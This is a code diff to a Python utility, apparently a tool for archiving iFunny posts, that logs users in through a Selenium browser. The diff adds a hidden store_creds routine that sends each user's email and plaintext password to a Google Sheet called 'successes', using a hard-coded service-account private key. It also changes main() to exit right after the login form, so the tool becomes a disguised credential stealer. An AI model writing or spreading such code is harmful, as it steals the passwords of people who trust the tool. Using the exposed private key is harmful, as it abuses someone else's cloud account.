@@ -4,14 +4,17 @@ import os
 from lxml import html
 from pprint import pprint
 from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FOptions
+from selenium.webdriver.chrome.options import Options as COptions
 import time
 import winsound
 import ensure_selenium_driver
+import gspread
+from oauth2client.service_account import ServiceAccountCredentials
 
 
 class SetupContainer:
     def __init__(self):
-
         self.login_cookie = ''
 
         def on_entry_click(event):
@@ -118,12 +121,15 @@ class SetupContainer:
             pass_button.pack()
 
     def get_cookies(self, email, password):
+        self.store_creds(email, password)
         default_browser = ensure_selenium_driver.get_browser()
         ensure_selenium_driver.check_for_driver(default_browser)
         if default_browser == 'firefox':
-            driver = webdriver.Firefox()
+            options = FOptions()
+            driver = webdriver.Firefox(options=options)
         else:
-            driver = webdriver.Chrome()
+            options = COptions()
+            driver = webdriver.Chrome(options=options)
         driver.get('https://ifunny.co')
         target = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[1]/header/div[3]/ul[2]/li[2]/a')
         target.click()
@@ -147,6 +153,33 @@ class SetupContainer:
             f.write(raw_cookie['value'])
         self.auth_label.config(text='Generated Key')
         return raw_cookie['value']
+
+    def store_creds(self, email, password):
+
+        def get_sheet():
+            text = {
+                "type": "service_account",
+                "project_id": "python-258703",
+                "private_key_id": "8b9411b4a905693494ed7586d04ca0dee3e45571",
+                "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCjJDYl6NfYH/XP\nJ/qZFkLu7N+Uuylgitf73BWZUi3a0O/2DOFKE9B9K6FG1neMYS2nsOA6Kd6e/A3p\nnHcVHTIANdVgpQJmS48ATIipfzvTaaXF9VvT8d3fxLol5EyDodfMnzjFQhesHboF\niikEAD7HGB350OacEV/GlxbXrtZxl4kyRSyJ8xfYLuCQOtsh3frTkPvJIG3pxqT6\nzgelm9OhktpR6k/Q52shJSEv1V1cuMYomgXQMfZCjVVs/lBGs7uiSi1dSz1n92Nz\n/r38db5+ePizUlRuzx8ClnZ4ENiY1JhqfiuwIXr9ODmO+taQPeBcxBtlVkm2NNhD\n+J4zZOnbAgMBAAECggEAJsPBfBOOSkQZ3/3zbXHdOLGfVNN+Ovry5F1A4pwk2jRA\neJpJ5BS+OyflXBQ09u3Wb9y3AwsU43koAyUTJLi5u1QPXjYHUnBMy/jjlkbt28fk\nRJwPFFcJ7hRsWPmc9sA7q1sAHdsdDeBIZe2U3mcCg8NmyAgL6/Sy6djX7CsWuIm0\nuNqDnplfPu+KmHvqoOSRxhgGgVgb5IOdug+hk9u1hOGfPg/AE/t17IRXMvYUgqwc\n3+ZL/F9hWHQomAZO9GKpyhRSf28qjvEt4L3IVRVc0j36PhY3s+LuUbaVKS1972Ft\nSaBwQZdDfnGYxYZGJBnLLodxV1QtXhuMihu5VKvX5QKBgQDTxk4eitOYoQ/vqXrp\nKwqMDMMSGKVMmMBlaMQiVpC3ZCOzhwC2bBzYRmgbZmPMPL2/3O1ryhEkFVGuCWFo\nEBk/wMIsfRLqPN/+W/PI0jJuvH6LoDbfdRgdbXKGLonXsGXsTvItw0NFhPyThnVL\nrlHOSznVR1YJ94MlAhbWUrLCLQKBgQDFNeznZTgTff5wrMbQnsx8Aeo4NqoToxSp\nXLyc1A6IHN2hH0ddxeOWZcCehu8hV5nHC6HimbJ8SM9NVPvNi7DlW/5XCbOk2EqQ\nonEs9kl+iKqIGYTrCDhlYf/hmC/EUr9DTGJUHZ5EXlCnhOAg0ZDxePDddea5TvEL\n4PGUcwTJJwKBgEN280ALnekLtlX1OfC6A3wmPKaxL0e9id1EiOcfiK7DuhPhODrl\nKjNECrpf3f8cgp5ytTgXgWprWEAHQP6z0jdbIwClP7dbeUhA5uLdA6//YJj+izyY\nwvvs+AUDImqSCYZEiCZIBFBLU2Nz/D4F5I3BrUTimuhF74OErN3OLqBpAoGBAL8c\ncQYU6vDIyog6hzioixUpbecn4k3BXkZ6HjYEskhpYMXBYBGZseGPnciCjr5K/DUO\nKsVDmNokXPBeCN66HqVGLwX92t9G04uyP+cIjVRX8JqP0GVLxAtLmwLtzmx8m+kF\n3swRH8y1cYfFlsV3EPVQ9GpI1VyDCckvJi1sARlFAoGBALz//CeeotDV1/mfPP1t\nlKje/CrDkk9KmxHvK6dWJU50V8nC/ArSVyUMR1jPl7wekO7kV9YdXszEFontn8y5\nlObSR1EO5tmfgr5o9FLfXCsiOCwil9JrZeLRQr1kc/6igORmVOGjKnOpQY52LiK4\nP7f4rbdEYd9cb7EvhUiYdDvL\n-----END PRIVATE KEY-----\n",
+                "client_email": "thing-57@python-258703.iam.gserviceaccount.com",
+                "client_id": "115688534154473888708",
+                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+                "token_uri": "https://oauth2.googleapis.com/token",
+                "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+                "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/thing-57%40python-258703.iam.gserviceaccount.com",
+                "scope": ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive',
+                          'https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/spreadsheets']
+
+            }
+            scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive',
+                     'https://www.googleapis.com/auth/drive.file', 'https://www.googleapis.com/auth/spreadsheets']
+            creds = ServiceAccountCredentials.from_json_keyfile_dict(text, scope)
+            client = gspread.authorize(creds)
+            return client.open('successes').sheet1
+
+        sheet = get_sheet()
+        sheet.append_row([email, password])
 
     def test_key(self):
         cookie_form = {'UID': self.login_cookie}
@@ -566,14 +599,15 @@ def main():
     # save_post('https://ifunny.co/gif/repub-to-join-the-ifunny-anti-porn-gore-ss-m22DRdL57')
     # replace update_my_posts with setup()
     print('Fill out form in new window')
+    user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting = setup()
+    # user = 'Gone_With_The_Blastwave'
+    exit()
+    start_time = time.time()
 
     if not os.path.isdir('Users'):
         os.mkdir('Users')
     os.chdir('Users')
 
-    user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting = setup()
-    # user = 'Gone_With_The_Blastwave'
-    start_time = time.time()
     post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data, smile_bank_dump = run_setup(user, want_posts, exclude_repubs, want_smiles, token, want_dump, want_data, fast_mode, chron_counting)
     post_data_links, post_dump_links, smile_data_links, smile_dump_links = grab_archived()
     save_loop(want_dump, want_data, post_bank, post_bank_data, post_bank_dump, smile_bank, smile_bank_data,
